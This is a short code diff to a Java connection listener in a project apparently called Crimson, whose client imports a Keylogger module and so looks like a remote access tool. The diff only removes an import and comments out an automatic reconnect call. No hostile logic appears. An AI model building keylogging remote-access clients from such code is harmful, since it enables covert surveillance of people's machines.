@@ -20,7 +20,6 @@ package com.subterranean_security.crimson.client.net.listener;
 import java.util.Observable;
 
 import com.subterranean_security.crimson.client.modules.Keylogger;
-import com.subterranean_security.crimson.client.net.ClientConnectionStore;
 import com.subterranean_security.crimson.core.net.Connector;
 import com.subterranean_security.crimson.core.net.Connector.CertificateState;
 import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
@@ -43,7 +42,8 @@ public class ClientConnectionEventListener extends ConnectionEventListener {
 				case CONNECTED:
 					break;
 				case NOT_CONNECTED:
-					ClientConnectionStore.connectionRoutine();
+					// TODO!!!!!!!!!!!!!!!!!!!!!111
+					// ClientConnectionStore.connectionRoutine();
 					break;
 				default:
 					break;
